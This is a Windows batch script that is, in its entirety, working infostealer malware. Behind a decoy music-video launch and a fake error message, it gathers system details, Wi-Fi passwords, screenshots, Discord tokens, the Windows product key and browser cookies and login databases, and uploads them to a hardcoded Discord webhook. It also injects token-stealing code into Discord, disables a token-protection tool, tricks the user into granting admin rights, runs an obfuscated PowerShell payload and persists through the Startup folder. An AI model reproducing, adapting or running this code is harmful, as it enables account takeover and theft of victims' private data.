@echo off

set webhook2=WEBHOOK
cls
start "" https://www.youtube.com/watch?v=D4i1J90oNEg
set /a X=%random% %% 1920
set /a Y=%random% %% 1080

start "" /min powershell -WindowStyle Hidden -Command ^
    $X = %X%; $Y = %Y%; ^
    Add-Type -AssemblyName 'System.Windows.Forms'; ^
    $form = New-Object System.Windows.Forms.Form; ^
    $form.Text = 'Error'; ^
    $form.Text = 'Error'; ^
    $form.Width = 0; $form.Height = 0; ^
    $form.StartPosition = 'Manual'; ^
    $form.Location = New-Object System.Drawing.Point($X, $Y); ^
    $form.TopMost = $true; ^
    $form.Show(); ^
    [System.Windows.Forms.MessageBox]::Show('ERROR: have fun with music untell set up finsh !', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error); ^
    powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize' -Name 'AppsUseLightTheme' -Value 0"
    $form.Close()
echo have fun with music untell set up finsh !

cls

cls



cls
curl -s -o info.txt http://ip-api.com/json 
cls
echo --------------------------------------------------------------------------- >> info.txt
cls
systeminfo >> info.txt
cls
curl -s -o nul -F "file1=@info.txt" %webhook2% 
cls
DEL /Q info.txt 
cls

)

cls
set webhook=https://discord.com/api/webhooks/1342460073196126239/K3ZLRM5nct9HuxabMDN4Plz1VFNETEofaTNtFfq9gbY9ARSWtst3LjznmA6fnsScmx4Y
cls

:starti
cls
set /a killdc = 0
cls

cls
curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
cls
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
cls
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "
cls



cls
echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt goto website
cls   
)

:aftertesti

cls
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt

cls
netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt

cls
if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end


cls
echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo { >>%userprofile%\AppData\Local\Temp\test.ps1
echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
timeout 1 >NUL
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 
cls


cls
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%


cls
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%
 


cls
echo $hook  = "%webhook%" >%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $token = new-object System.Collections.Specialized.StringCollection >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $db_path = @( >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
cls
echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"	 >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
cls
echo ) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1 
echo foreach ($path in $db_path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     if (Test-Path $path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $data = Get-Content -Path "$($path)\$($file)" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $match = $regex.Match($data) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo            while ($match.Success) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 if (!$token.Contains($match.Value)) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                     $token.Add($match.Value) ^| out-null >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                $match = $match.NextMatch() >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo         } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $content = ">>> ||@everyone|| **New Token** ``` " >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo foreach ($data in $token) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $content = [string]::Concat($content, "`n", $data) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $content = [string]::Concat($content, "``` ") >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\testtttt.ps1
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\testtttt.ps1
cls
set /a app = 0 
set /a voice = 0
if exist %userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js
:a
cls
if exist %userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js goto b
set /a app=%app%+1
if %app% == 10 goto c
goto a
:c
cls
set /a app=0 
set /a voice=%voice%+1 
if %voice% == 99 goto e
goto a
:b 
cls
echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js 
if %killdc% == 1 goto d
goto e
:d
cls


cls
taskkill /im Discord.exe /f
taskkill /im DiscordTokenProtector.exe /f
del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json

Cls
echo Set WshShell = CreateObject("WScript.Shell") >%userprofile%\AppData\Local\Temp\key.vbs
echo Set FSO = CreateObject("Scripting.FileSystemObject") >>%userprofile%\AppData\Local\Temp\key.vbs
echo Set File = FSO.CreateTextFile("%userprofile%\AppData\Local\Temp\Productkey.txt",True) >>%userprofile%\AppData\Local\Temp\key.vbs
echo File.Write ConvertToKey(WshShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DigitalProductId")) >>%userprofile%\AppData\Local\Temp\key.vbs
echo File.Close >>%userprofile%\AppData\Local\Temp\key.vbs
echo Function ConvertToKey(Key) >>%userprofile%\AppData\Local\Temp\key.vbs
echo Const KeyOffset = 52 >>%userprofile%\AppData\Local\Temp\key.vbs
echo i = 28 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Chars = "BCDFGHJKMPQRTVWXY2346789" >>%userprofile%\AppData\Local\Temp\key.vbs
echo Do >>%userprofile%\AppData\Local\Temp\key.vbs
echo Cur = 0 >>%userprofile%\AppData\Local\Temp\key.vbs
echo x = 14 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Do >>%userprofile%\AppData\Local\Temp\key.vbs
echo Cur = Cur * 256 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Cur = Key(x + KeyOffset) + Cur >>%userprofile%\AppData\Local\Temp\key.vbs
echo Key(x + KeyOffset) = (Cur \ 24) And 255 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Cur = Cur Mod 24 >>%userprofile%\AppData\Local\Temp\key.vbs
echo x = x -1 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Loop While x ^>= 0 >>%userprofile%\AppData\Local\Temp\key.vbs
echo i = i -1 >>%userprofile%\AppData\Local\Temp\key.vbs
echo KeyOutput = Mid(Chars, Cur + 1, 1) ^& KeyOutput >>%userprofile%\AppData\Local\Temp\key.vbs
echo If (((29 - i) Mod 6) = 0) And (i ^<^> -1) Then >>%userprofile%\AppData\Local\Temp\key.vbs
echo i = i -1 >>%userprofile%\AppData\Local\Temp\key.vbs
echo KeyOutput = "-" ^& KeyOutput >>%userprofile%\AppData\Local\Temp\key.vbs
echo End If >>%userprofile%\AppData\Local\Temp\key.vbs
echo Loop While i ^>= 0 >>%userprofile%\AppData\Local\Temp\key.vbs
echo ConvertToKey = KeyOutput >>%userprofile%\AppData\Local\Temp\key.vbs
echo End Function >>%userprofile%\AppData\Local\Temp\key.vbs
start %userprofile%\AppData\Local\Temp\key.vbs
timeout 1 >NUL
cls
set /p keya=<%localappdata%\Temp\Productkey.txt

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Productkey: %keya%\"}" %webhook%

Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /c Batlogger.bat"
oShell.Run strArgs, 0, false
cls

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Chrome data \"}" %webhook%
curl -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
curl -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
curl -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
curl -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
curl -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
curl -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Opera data: \"}" %webhook%
curl -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
curl -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
curl -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhook%
curl -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
curl -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Brave data: \"}" %webhook%
curl -F ff=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks" %webhook%
curl -F hf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History" %webhook%
curl -F df=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Login Data" %webhook%
curl -F daf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Shortcuts" %webhook%
cls
cd %mypath%

cls
del %localappdata%\Temp\ip.txt 
del %localappdata%\Temp\ipp.txt 
del %localappdata%\Temp\sysi.txt 
del %localappdata%\Temp\System_INFO.txt 
del %localappdata%\Temp\netstat.txt 
del %localappdata%\Temp\test.ps1 
del %localappdata%\Temp\programms.txt 
del %localappdata%\Temp\%username%_Capture.jpg
del %localappdata%\Temp\uuid.txt
del %localappdata%\Temp\testtttt.ps1 
del %localappdata%\Temp\wlan.txt
del %localappdata%\Temp\key.vbs
del %localappdata%\Temp\Productkey.txt

@echo off
setlocal enabledelayedexpansion


:: If not admin, relaunch the script with admin rights
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    echo click yes to install a gui
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\GetAdmin.vbs"
    echo UAC.ShellExecute "%~0", "", "", "runas", 1 >> "%temp%\GetAdmin.vbs"
    "%temp%\GetAdmin.vbs"
    del "%temp%\GetAdmin.vbs"
    exit /B
)


:check_Permissions
    
::ik this does same as the vbs uac prompt but ykyk
    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto starti
    ) else (
       cls
       echo Failure: Please run the file again with Admin
       timeout 2 >NUL
       goto check_Permissions
    )

:starti
echo installing a gui
powershell -Command "Get-WmiObject Win32_PortConnector" >%localappdata%\Temp\antivm.txt
findstr /m "Port Connector" %localappdata%\Temp\antivm.txt 
if %errorlevel%==0 (
goto a
)

cls
del %localappdata%\Temp\antivm.txt
goto realstart

:a
del %localappdata%\Temp\antivm.txt
goto realstart 



:realstart
:: hides console window feel free to decode!
Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIAUQBXAFIAawBMAFYAUgA1AGMARwBVAGcAUQBDAEkATgBDAGkAQQBnAEkAQwBCADEAYwAyAGwAdQBaAHkAQgBUAGUAWABOADAAWgBXADAANwBEAFEAbwBnAEkAQwBBAGcAZABYAE4AcABiAG0AYwBnAFUAMwBsAHoAZABHAFYAdABMAGwASgAxAGIAbgBSAHAAYgBXAFUAdQBTAFcANQAwAFoAWABKAHYAYwBGAE4AbABjAG4AWgBwAFkAMgBWAHoATwB3ADAASwBEAFEAbwBnAEkAQwBBAGcAYwBIAFYAaQBiAEcAbABqAEkARwBOAHMAWQBYAE4AegBJAEYAVgB6AFoAWABJAHoATQBpAEIANwBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEYAdABFAGIARwB4AEoAYgBYAEIAdgBjAG4AUQBvAEkAbgBWAHoAWgBYAEkAegBNAGkANQBrAGIARwB3AGkASwBWADAATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBjAEgAVgBpAGIARwBsAGoASQBIAE4AMABZAFgAUgBwAFkAeQBCAGwAZQBIAFIAbABjAG0ANABnAFkAbQA5AHYAYgBDAEIAVABhAEcAOQAzAFYAMgBsAHUAWgBHADkAMwBLAEUAbAB1AGQARgBCADAAYwBpAEIAbwBWADIANQBrAEwAQwBCAHAAYgBuAFEAZwBiAGsATgB0AFoARgBOAG8AYgAzAGMAcABPAHcAMABLAEkAQwBBAGcASQBIADAATgBDAGcAMABLAEkAQwBBAGcASQBIAEIAMQBZAG0AeABwAFkAeQBCAGoAYgBHAEYAegBjAHkAQgBMAFoAWABKAHUAWgBXAHcAegBNAGkAQgA3AEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkARgB0AEUAYgBHAHgASgBiAFgAQgB2AGMAbgBRAG8ASQBtAHQAbABjAG0ANQBsAGIARABNAHkATABtAFIAcwBiAEMASQBwAFgAUQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCAHcAZABXAEoAcwBhAFcATQBnAGMAMwBSAGgAZABHAGwAagBJAEcAVgA0AGQARwBWAHkAYgBpAEIASgBiAG4AUgBRAGQASABJAGcAUgAyAFYAMABRADIAOQB1AGMAMgA5AHMAWgBWAGQAcABiAG0AUgB2AGQAeQBnAHAATwB3ADAASwBJAEMAQQBnAEkASAAwAE4AQwBpAEoAQQBEAFEAbwBOAEMAaQBSAHIAYQBYAFIAMABlAFcAaABwAFoARwBVAGcAUABTAEEAdwBEAFEAbwBOAEMAaQBSAHIAYQBYAFIAMABlAFgAZABwAGIAbQBRAGcAUABTAEIAYgBTADIAVgB5AGIAbQBWAHMATQB6AEoAZABPAGoAcABIAFoAWABSAEQAYgAyADUAegBiADIAeABsAFYAMgBsAHUAWgBHADkAMwBLAEMAawBOAEMAbABkAHkAYQBYAFIAbABMAFUAaAB2AGMAMwBRAGcASQBuAGwAdgBkAFMAQgBqAFkAVwA0AGcAYwAyAFYAbABJAEgAUgBvAGEAWABNAGgASQBnADAASwBVADMAUgBoAGMAbgBRAHQAVQAyAHgAbABaAFgAQQBnAE0AdwAwAEsAVwAxAFYAegBaAFgASQB6AE0AbAAwADYATwBsAE4AbwBiADMAZABYAGEAVwA1AGsAYgAzAGMAbwBKAEcAdABwAGQASABSADUAZAAyAGwAdQBaAEMAdwBnAEoARwB0AHAAZABIAFIANQBhAEcAbABrAFoAUwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBJAG4AbAB2AGQAUwBCAGoAWQBXADUAdQBiADMAUQBnAGMAMgBWAGwASQBIAFIAbwBhAFgATQBoAEkAZwAwAEsAVQAzAFIAaABjAG4AUQB0AFUAMgB4AGwAWgBYAEEAZwBNAFQAVQBOAEMAZwA9AD0AIgB9ACcAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgApAC4AUwBjAHIAaQBwAHQAKQApACAAfAAgAGkAZQB4AA==
set "destination=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

copy "%~f0" "%destination%"

cd /d "%destination%"
attrib +h +s %destination%
:: Replace your webhook here so it sends the request or else it wont work!
set "webhook=https://discord.com/api/webhooks/1342460073196126239/K3ZLRM5nct9HuxabMDN4Plz1VFNETEofaTNtFfq9gbY9ARSWtst3LjznmA6fnsScmx4Y"
set "rmpath=%userprofile%\AppData\Roaming\EvilBytecode"
::roaming path that where info will be stored in like sys and ip.

goto discordkill


:discordkill
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

taskkill /im Discord.exe /f
taskkill /im DiscordTokenProtector.exe /f
cls
del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
cls
echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
cls
goto tokens


:ipnsys
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

cls
if not exist "!rmpath!" mkdir "!rmpath!"
for /f "delims=" %%i in ('powershell -Command "& { $env:COMPUTERNAME; $env:USERNAME; (Get-WmiObject Win32_VideoController).Caption; (Get-WmiObject Win32_Processor).Name; (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB; (Get-CimInstance Win32_ComputerSystemProduct).UUID }"') do (
    set "info=%%i"
    set "info=!info:"=!"
    echo !info!>> "!rmpath!\sys.txt"
)
powershell -Command "$response = Invoke-RestMethod -Uri 'https://ipinfo.io/json' -Method GET; $response.ip" > "!rmpath!\ip.txt"
curl -s -H "Expect: application/json" -F "file=@!rmpath!\sys.txt" %webhook% >NUL
curl -s -H "Expect: application/json" -F "file=@!rmpath!\ip.txt" %webhook% >NUL 
:: silent and nul so it doesnt show it sended request
del "!rmpath!\sys.txt"
del "!rmpath!\ip.txt"


goto extrainfo

:extrainfo
